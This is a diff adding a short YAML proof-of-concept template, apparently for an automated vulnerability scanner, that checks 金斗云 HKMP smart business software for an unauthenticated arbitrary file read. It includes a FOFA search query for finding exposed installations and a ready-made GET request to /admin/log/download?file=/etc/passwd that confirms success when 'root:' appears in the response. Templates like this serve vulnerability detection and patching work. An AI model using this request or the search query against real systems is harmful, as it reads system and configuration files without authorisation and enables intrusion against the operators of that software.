@@ -1,0 +1,27 @@
+id: jindouyun-HKMP_download-File-reading
+
+info:
+  name: 金斗云 HKMP智慧商业软件 download 任意文件读取漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="金斗云 Copyright"
+    金斗云 HKMP智慧商业软件 download 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference:
+    - https://superhero.blog.csdn.net/article/details/140485949
+  tags: File reading
+
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /admin/log/download?file=/etc/passwd
+      headers:
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+    expression: response.status == 200 && response.body.bcontains(b'root:')
+
+expression: r0() 
+
+
